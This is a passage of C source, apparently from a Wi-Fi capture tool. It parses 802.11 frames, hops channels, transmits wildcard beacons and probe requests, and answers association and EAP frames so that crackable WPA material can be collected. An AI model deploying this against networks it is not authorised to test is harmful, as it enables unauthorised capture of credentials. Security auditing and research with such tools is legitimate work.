	return;
	}
rthp = le32toh(rth->it_present);
if((rthp & IEEE80211_RADIOTAP_TX_FLAGS) == IEEE80211_RADIOTAP_TX_FLAGS) return; /* outgoing packet */
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
if(ieee82011len < MAC_SIZE_ACK) return;
tvlast.tv_sec = tv.tv_sec;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON) process80211beacon();
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211proberesponse();
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ) process80211proberequest();
	else if(macfrx->subtype == IEEE80211_STYPE_ACTION) process80211action();
	else if(macfrx->subtype == IEEE80211_STYPE_AUTH)
		{
		if(memcmp(&macrgclient, macfrx->addr1, 6) != 0) process80211authentication();
		else process80211authentication_resp_rg();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ)
		{
		process80211association_req();
		confirmassociation_req();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP) process80211association_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ)
		{
		process80211reassociation_req();
		confirmassociation_req();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP) process80211reassociation_resp();
	}
else if(macfrx->type == IEEE80211_FTYPE_CTL)
	{
	if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211pspoll();
	else if(macfrx->subtype == IEEE80211_STYPE_BACK_REQ) process80211backreq();
	else if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211back();
	}
else if(macfrx->type == IEEE80211_FTYPE_DATA)
	{
	if((macfrx->subtype &IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)
		{
		payloadptr += QOS_SIZE;
		payloadlen -= QOS_SIZE;
		}
	if((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC)
		{
		process80211null();
		return;
		}
	if((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC)
		{
		process80211qosnull();
		return;
		}
	if(payloadlen < LLC_SIZE) return;
	llcptr = payloadptr;
	llc = (llc_t*)llcptr;
	if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		process80211eap();
		return;
		}
	#ifdef DUMPIPV4
	if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		writeepb(fd_pcapng);
		return;
		}
	#endif
	#ifdef DUMPIPV6
	if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		writeepb(fd_pcapng);
		return;
		}
	#endif
	process80211data();
	#if defined(DUMPWPA) || defined(DUMPWEP)
	if(macfrx->prot ==1)
		{
		mpduptr = payloadptr;
		mpdu = (mpdu_t*)mpduptr;
		#ifdef DUMPWPA
		if(((mpdu->keyid >> 5) &1) == 1)
			{
			 writeepb(fd_pcapng);
			return;
			}
		#endif
		#ifdef DUMPWEP
		 if(((mpdu->keyid >> 5) &1) == 0)
			{
			writeepb(fd_pcapng);
			return;
			}
		#endif
		}
	#endif
	}
return;
}
/*===========================================================================*/
static inline bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = ptrscanlist->frequency;
pwrq.u.freq.e = 6;
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) return false;
if(ptrscanlist->frequency < 3000)
	{
	hdradiotap[9] = 0x02;
	hdradiotap_ack[9] = 0x02;
	return true;
	}
hdradiotap[9] = 0x0c;
hdradiotap_ack[9] = 0x0c;
return true;
}
/*===========================================================================*/
static inline void fdloopscan()
{
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static struct timespec sleepled;

lasterrorcount = 0;
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
ptrscanlist = scanlist;
if(set_channel() == false)
	{
	errorcount++;
	return;
	}
#ifdef GETM2
if(ptrscanlist->frequency < 3000) send_beacon_wildcard();
else send_beacon_wildcard_5();
#endif
#ifdef GETM1
if(ptrscanlist->frequency < 3000) send_proberequest_wildcard();
else  send_proberequest_wildcard_5();
#endif
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000L) + tv.tv_usec;
tfctimestamp = timestamp;
while(wantstopflag == false)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0)
			{
			if(ongpiobutton == WANT_POWEROFF) poweroffflag = true;
			if(ongpiobutton == WANT_REBOOT) rebootflag = true;
			wantstopflag = true;
			}
		}
	gettimeofday(&tv, NULL);
	timestamp = ((uint64_t)tv.tv_sec *1000000L) + tv.tv_usec;
	if(tv.tv_sec >= tvtot.tv_sec)
		{
		if(ontot == WANT_POWEROFF) poweroffflag = true;
		if(ontot == WANT_REBOOT) rebootflag = true;
		wantstopflag = true;
		}
	if(errorcount >= ERROR_MAX)
		{
		if(onerror == WANT_POWEROFF) poweroffflag = true;
		if(onerror == WANT_REBOOT) rebootflag = true;
		wantstopflag = true;
		fprintf(stderr, "error count reached ERROR_MAX\n");
		if(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;
		continue;
		}
	if((tv.tv_sec -tvoldled.tv_sec) >= LEDFLASHINTERVAL)
		{
		tvoldled.tv_sec = tv.tv_sec;
		#ifdef STATUSOUT
		if(errorcount > lasterrorcount) fprintf(stderr, "ERROR: %d\n", errorcount);
		lasterrorcount = errorcount;
		#endif
		if(gpiostatusled > 0)
			{
			GPIO_SET = 1 << gpiostatusled;
			nanosleep(&sleepled, NULL);
			GPIO_CLR = 1 << gpiostatusled;
			if((tv.tv_sec - tvlast.tv_sec) > WATCHDOG)
				{
				nanosleep(&sleepled, NULL);
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		}
	if((tv.tv_sec -tvold.tv_sec) >= staytime)
		{
		tvold.tv_sec = tv.tv_sec;
		ptrscanlist++;
		if(ptrscanlist->frequency == 0) ptrscanlist = scanlist;
		if(set_channel() == false) errorcount++;
		#ifdef GETM2
		if(ptrscanlist->frequency < 3000) send_beacon_wildcard();
		else send_beacon_wildcard_5();
		#endif
		#ifdef GETM1
		if(ptrscanlist->frequency < 3000) send_proberequest_wildcard();
		else  send_proberequest_wildcard_5();
		#endif
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	tsfd.tv_sec = fdrxsectimer;
	tsfd.tv_nsec = fdrxnsectimer;
	fdnum = pselect(fd_socket +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		if(wantstopflag == false) errorcount++;
		continue;
		}
	if(FD_ISSET(fd_socket, &readfds)) process_packet();
	#ifdef GETM2
	#ifdef BEACONUNSET
	else
		{
		if(ptrscanlist->frequency < 3000) send_beacon1();
		else send_beacon1_5();
		}
	#else
	else
		{
		if(ptrscanlist->frequency < 3000) send_beacon();
		else send_beacon_5();
		}
	#endif
	#endif
	}
if(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;
fprintf(stdout, "\nterminated loop\n");
return;
}
/*===========================================================================*/
static inline void fdloopscantfc()
{
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static struct timespec sleepled;

lasterrorcount = 0;
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
ptrscanlist = scanlist;
if(set_channel() == false)
	{
	errorcount++;
	return;
	}
#ifdef GETM2
if(ptrscanlist->frequency < 3000) send_beacon_wildcard();
else send_beacon_wildcard_5();
#endif
#ifdef GETM1
if(ptrscanlist->frequency < 3000) send_proberequest_wildcard();
else  send_proberequest_wildcard_5();
#endif
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000L) + tv.tv_usec;
tfctimestamp = timestamp;
while(wantstopflag == false)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0)
			{
			if(ongpiobutton == WANT_POWEROFF) poweroffflag = true;
			if(ongpiobutton == WANT_REBOOT) rebootflag = true;
			wantstopflag = true;
			}
		}
	gettimeofday(&tv, NULL);
	timestamp = ((uint64_t)tv.tv_sec *1000000L) + tv.tv_usec;
	if(tv.tv_sec >= tvtot.tv_sec)
		{
		if(ontot == WANT_POWEROFF) poweroffflag = true;
		if(ontot == WANT_REBOOT) rebootflag = true;
		wantstopflag = true;
		}
	if(errorcount >= ERROR_MAX)
		{
		if(onerror == WANT_POWEROFF) poweroffflag = true;
		if(onerror == WANT_REBOOT) rebootflag = true;
		wantstopflag = true;
		fprintf(stderr, "error count reached ERROR_MAX\n");
		if(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;
		continue;
		}
	if((tv.tv_sec -tvoldled.tv_sec) >= LEDFLASHINTERVAL)
		{
		tvoldled.tv_sec = tv.tv_sec;
		#ifdef STATUSOUT
		if(errorcount > lasterrorcount) fprintf(stderr, "ERROR: %d\n", errorcount);
		lasterrorcount = errorcount;
		#endif
		if(gpiostatusled > 0)
			{
			GPIO_SET = 1 << gpiostatusled;
			nanosleep(&sleepled, NULL);
			GPIO_CLR = 1 << gpiostatusled;
			if((tv.tv_sec - tvlast.tv_sec) > WATCHDOG)
				{
				nanosleep(&sleepled, NULL);
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		}
	if((timestamp -tfctimestamp) >= FDLASTMSECTIMER)
		{
		tfctimestamp = timestamp;
		ptrscanlist++;
		if(ptrscanlist->frequency == 0) ptrscanlist = scanlist;
		if(set_channel() == false) errorcount++;
		#ifdef GETM2
		if(ptrscanlist->frequency < 3000) send_beacon_wildcard();
		else send_beacon_wildcard_5();
		#endif
		#ifdef GETM1
		if(ptrscanlist->frequency < 3000) send_proberequest_wildcard();
		else  send_proberequest_wildcard_5();
		#endif
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	tsfd.tv_sec = fdrxsectimer;
	tsfd.tv_nsec = fdrxnsectimer;
	fdnum = pselect(fd_socket +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		if(wantstopflag == false) errorcount++;
		continue;
		}
	if(FD_ISSET(fd_socket, &readfds)) process_packet();
	#ifdef GETM2
	#ifdef BEACONUNSET
	else
		{
		if(ptrscanlist->frequency < 3000) send_beacon1();
		else send_beacon1_5();
		}
	#else
	else
		{
		if(ptrscanlist->frequency < 3000) send_beacon();
		else send_beacon_5();
		}
	#endif
	#endif
	}
if(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;
fprintf(stdout, "\nterminated loop\n");
return;
}
/*===========================================================================*/
static inline void fdloop()
{
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static struct timespec sleepled;

lasterrorcount = 0;
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
ptrscanlist = scanlist;
if(set_channel() == false)
	{
	errorcount++;
	return;
	}
#ifdef GETM2
if(ptrscanlist->frequency < 3000) send_beacon_wildcard();
else send_beacon_wildcard_5();
#endif
#ifdef GETM1
if(ptrscanlist->frequency < 3000) send_proberequest_wildcard();
else  send_proberequest_wildcard_5();
#endif
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000L) + tv.tv_usec;
tfctimestamp = timestamp;
while(wantstopflag == false)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0)
			{
			if(ongpiobutton == WANT_POWEROFF) poweroffflag = true;
			if(ongpiobutton == WANT_REBOOT) rebootflag = true;
			wantstopflag = true;
			}
		}
	gettimeofday(&tv, NULL);
	timestamp = ((uint64_t)tv.tv_sec *1000000L) + tv.tv_usec;
	if(tv.tv_sec >= tvtot.tv_sec)
		{
		if(ontot == WANT_POWEROFF) poweroffflag = true;
		if(ontot == WANT_REBOOT) rebootflag = true;
		wantstopflag = true;
		}
	if(errorcount >= ERROR_MAX)
		{
		if((errorcount %ERROR_MAX) == 0)
			{
			if(onerror == WANT_POWEROFF) poweroffflag = true;
			if(onerror == WANT_REBOOT) rebootflag = true;
			wantstopflag = true;
			fprintf(stderr, "error count reached ERROR_MAX\n");
			}
		if(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;
		continue;
		}
	if((tv.tv_sec -tvold.tv_sec) >= LEDFLASHINTERVAL)
		{
		tvold.tv_sec = tv.tv_sec;
		#ifdef STATUSOUT
		if(errorcount > lasterrorcount) fprintf(stderr, "ERROR: %d\n", errorcount);
		lasterrorcount = errorcount;
		#endif
		#ifdef GETM2
		if(ptrscanlist->frequency < 3000) send_beacon_wildcard();
		else send_beacon_wildcard_5();
		#endif
		#ifdef GETM1
		if(ptrscanlist->frequency < 3000) send_proberequest_wildcard();
		else  send_proberequest_wildcard_5();
		#endif
		if(gpiostatusled > 0)
			{
			GPIO_SET = 1 << gpiostatusled;
			nanosleep(&sleepled, NULL);
			GPIO_CLR = 1 << gpiostatusled;
			if((tv.tv_sec - tvlast.tv_sec) > WATCHDOG)
				{
				nanosleep(&sleepled, NULL);
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	tsfd.tv_sec = fdrxsectimer;
	tsfd.tv_nsec = fdrxnsectimer;
	fdnum = pselect(fd_socket +1, &readfds, NULL, NULL, &tsfd, NULL);
	if(fdnum < 0)
		{
		if(wantstopflag == false) errorcount++;
		continue;
		}
	if(FD_ISSET(fd_socket, &readfds)) process_packet();
	#ifdef GETM2
	#ifdef BEACONUNSET
	else
		{
		if(ptrscanlist->frequency < 3000) send_beacon1();
		else send_beacon1_5();
		}
	#else
	else
		{
		if(ptrscanlist->frequency < 3000) send_beacon();
		else send_beacon_5();
		}
	#endif
	#endif
	}
if(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;
fprintf(stdout, "\nterminated loop\n");
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void standbyloop()
{
static struct timespec sleepled;
static struct timespec standbytime;

fprintf(stdout, "entering standby loop\n");
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
standbytime.tv_sec = LEDFLASHINTERVAL;
standbytime.tv_nsec = 0;
while(wantstopflag == false)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0)
			{
			if(ongpiobutton == WANT_POWEROFF) poweroffflag = true;
			if(ongpiobutton == WANT_REBOOT) rebootflag = true;
			wantstopflag = true;
			}
		}
	if(gpiostatusled > 0)
		{
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		}
	if(wantstopflag == true) break;
	nanosleep(&standbytime, NULL);
	}
if(gpiostatusled > 0) GPIO_SET = 1 << gpiostatusled;
fprintf(stdout, "\nterminated loop\n");
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
	{
	if(onsigterm == WANT_POWEROFF) poweroffflag = true;
	if(onsigterm == WANT_REBOOT) rebootflag = true;
	wantstopflag = true;
	}
return;
}
/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if(*ptr != '\n') break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if(*ptr != '\r') break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream)) return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL) return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void getchannel(char *scanlistin)
{
static struct iwreq pwrq;
static char *scanlistdup;
static char *tokptr;

scanlistdup = strndup(scanlistin, 4096);
if(scanlistdup == NULL) return;
tokptr = strtok(scanlistdup, ",");
ptrscanlist = scanlist;
while((tokptr != NULL) && (ptrscanlist < scanlist +SCANLIST_MAX))
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = atoi(tokptr);
	tokptr = strtok(NULL, ",");
	if(pwrq.u.freq.m > 1000) pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	if(pwrq.u.freq.m == 0) continue;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) ptrscanlist->frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) ptrscanlist->frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) ptrscanlist->frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) ptrscanlist->frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) ptrscanlist->frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) ptrscanlist->frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) ptrscanlist->frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		if((ptrscanlist->frequency >= 2407) && (ptrscanlist->frequency <= 2477)) ptrscanlist->channel = (ptrscanlist->frequency -2407)/5;
		else if((ptrscanlist->frequency >= 2479) && (ptrscanlist->frequency <= 2489)) ptrscanlist->channel = (ptrscanlist->frequency -2412)/5;
		else if((ptrscanlist->frequency >= 5005) && (ptrscanlist->frequency <= 5980)) ptrscanlist->channel = (ptrscanlist->frequency -5000)/5;
		else if((ptrscanlist->frequency >= 5955) && (ptrscanlist->frequency <= 6415)) ptrscanlist->channel = (ptrscanlist->frequency -5950)/5;
		else continue;
		}
	else
		{
		fprintf(stderr, "driver doesn't report frequencies (reported value: %04d %d)\n", pwrq.u.freq.m, pwrq.u.freq.e);
		continue;
		}
	if(((ptrscanlist->channel) < 1) || ((ptrscanlist->channel) > 255)) continue;
	ptrscanlist++;
	}
ptrscanlist->frequency = 0;
ptrscanlist->channel = 0;
free(scanlistdup);
return;
}
/*===========================================================================*/
static inline void getscanlist(uint8_t scanband)
{
static int c;
static struct iwreq pwrq;

ptrscanlist = scanlist;
if((scanband & SCANBAND24) == SCANBAND24)
	{
	for(c = 2412; c <= 2484; c++)
		{
		if(ptrscanlist >= scanlist +SCANLIST_MAX) break;
		memset(&pwrq, 0, sizeof(pwrq));
		memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
		pwrq.u.freq.flags = IW_FREQ_FIXED;
		pwrq.u.freq.m = c;
		pwrq.u.freq.e = 6;
		if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;
		if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
		if(pwrq.u.freq.m == 0) continue;
		ptrscanlist->frequency = c;
		if((ptrscanlist->frequency >= 2412) && (ptrscanlist->frequency <= 2472)) ptrscanlist->channel = (ptrscanlist->frequency -2407)/5;
		else if(ptrscanlist->frequency == 2484) ptrscanlist->channel = (ptrscanlist->frequency -2412)/5;
		else continue;
		if(((ptrscanlist->channel) < 1) || ((ptrscanlist->channel) > 255)) continue;
		ptrscanlist++;
		}
	}
if((scanband & SCANBAND5) == SCANBAND5)
	{
	for(c = 5180; c <= 5905; c++)
		{
		if(ptrscanlist >= scanlist +SCANLIST_MAX) break;
		memset(&pwrq, 0, sizeof(pwrq));
		memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
		pwrq.u.freq.flags = IW_FREQ_FIXED;
		pwrq.u.freq.m = c;
		pwrq.u.freq.e = 6;
		if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;
		if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
		if(pwrq.u.freq.m == 0) continue;
		ptrscanlist->frequency = c;
		if((ptrscanlist->frequency >= 5180) && (ptrscanlist->frequency <= 5905)) ptrscanlist->channel = (ptrscanlist->frequency -5000)/5;
		else continue;
		if(((ptrscanlist->channel) < 1) || ((ptrscanlist->channel) > 255)) continue;
		ptrscanlist++;
		}
	}
if((scanband & SCANBAND6) == SCANBAND6)
	{
	for(c = 5955; c <= 7115; c++)
		{
		if(ptrscanlist >= scanlist +SCANLIST_MAX) break;
		memset(&pwrq, 0, sizeof(pwrq));
		memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
		pwrq.u.freq.flags = IW_FREQ_FIXED;
		pwrq.u.freq.m = c;
		pwrq.u.freq.e = 6;
		if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;
		if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
		if(pwrq.u.freq.m == 0) continue;
		ptrscanlist->frequency = c;
		if((ptrscanlist->frequency >= 5955) && (ptrscanlist->frequency <= 7115)) ptrscanlist->channel = (ptrscanlist->frequency -5950)/5;
		else continue;
		if(((ptrscanlist->channel) < 1) || ((ptrscanlist->channel) > 255)) continue;
		ptrscanlist++;
		}
	}
ptrscanlist->frequency = 0;
ptrscanlist->channel = 0;
return;
}
/*===========================================================================*/
static inline void show_channels()
{
static int c;
static struct iwreq pwrq;
static int frequency;
static int exponent;

fprintf(stdout, "%s available frequencies, channels and tx power reported by driver:\n", ifname);
for(c = 2412; c <= 2484; c++)
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;

	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	frequency = pwrq.u.freq.m;
	exponent = pwrq.u.freq.e;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		}
	else
		{
		fprintf(stderr, "driver doesn't allow frequency scan\n");
		continue;
		}
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.txpower.value = -1;
	pwrq.u.txpower.fixed = 1;
	pwrq.u.txpower.disabled = 0;
	pwrq.u.txpower.flags = IW_TXPOW_DBM;
	if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0) continue;

	if((frequency >= 2412) && (frequency <= 2472)) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -2407)/5, pwrq.u.txpower.value);
	else if(frequency == 2484) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -2412)/5, pwrq.u.txpower.value);
	else fprintf(stderr, "unexpected frequency %4dMHz /exponent %d (%2d dBm)\n", frequency, exponent, pwrq.u.txpower.value);
	}

for(c = 5180; c <= 5905; c++)
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;

	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	frequency = pwrq.u.freq.m;
	exponent = pwrq.u.freq.e;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		}
	else
		{
		fprintf(stderr, "driver doesn't allow frequency scan\n");
		continue;
		}
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.txpower.value = -1;
	pwrq.u.txpower.fixed = 1;
	pwrq.u.txpower.disabled = 0;
	pwrq.u.txpower.flags = IW_TXPOW_DBM;
	if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0) continue;

	if((frequency >= 5180) && (frequency <= 5905)) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -5000)/5, pwrq.u.txpower.value);
	else fprintf(stderr, "unexpected frequency %4dMHz /exponent %d (%2d dBm)\n", frequency, exponent, pwrq.u.txpower.value);
	}

for(c = 5955; c <= 7115; c++)
	{
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	pwrq.u.freq.e = 6;
	if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) continue;

	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	if(ioctl(fd_socket, SIOCGIWFREQ, &pwrq) < 0) continue;
	frequency = pwrq.u.freq.m;
	exponent = pwrq.u.freq.e;
	if(pwrq.u.freq.m > 1000)
		{
		if(pwrq.u.freq.e == 6) frequency = pwrq.u.freq.m;
		else if(pwrq.u.freq.e == 5) frequency = pwrq.u.freq.m /10;
		else if(pwrq.u.freq.e == 4) frequency = pwrq.u.freq.m /100;
		else if(pwrq.u.freq.e == 3) frequency = pwrq.u.freq.m /1000;
		else if(pwrq.u.freq.e == 2) frequency = pwrq.u.freq.m /10000;
		else if(pwrq.u.freq.e == 1) frequency = pwrq.u.freq.m /100000;
		else if(pwrq.u.freq.e == 0) frequency = pwrq.u.freq.m /1000000;
		else
			{
			fprintf(stderr, "unhandled expontent %d reported by driver\n", pwrq.u.freq.e);
			continue;
			}
		}
	else
		{
		fprintf(stderr, "driver doesn't allow frequency scan\n");
		continue;
		}
	memset(&pwrq, 0, sizeof(pwrq));
	memcpy(&pwrq.ifr_name, ifname, IFNAMSIZ);
	pwrq.u.txpower.value = -1;
	pwrq.u.txpower.fixed = 1;
	pwrq.u.txpower.disabled = 0;
	pwrq.u.txpower.flags = IW_TXPOW_DBM;
	if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0) continue;

	if((frequency >= 5955) && (frequency <= 7115)) fprintf(stdout, "%4dMHz %3d (%2d dBm)\n", c, (frequency -5950)/5, pwrq.u.txpower.value);
	else fprintf(stderr, "unexpected frequency %4dMHz /exponent %d (%2d dBm)\n", frequency, exponent, pwrq.u.txpower.value);
	}
return;
}
/*===========================================================================*/
static inline void getfirstinterfacename()
{
static int fd_socketinfo;
static struct ifaddrs *ifaddr = NULL;
static struct ifaddrs *ifa = NULL;
static struct iwreq iwrinfo;

if(getifaddrs(&ifaddr) == -1) return;
for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
	{
	if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
		{
		if((fd_socketinfo = socket(AF_INET, SOCK_STREAM, 0)) != -1)
			{
			memset(&iwrinfo, 0, sizeof(iwrinfo));
			memcpy(&iwrinfo.ifr_name, ifa->ifa_name, IFNAMSIZ);
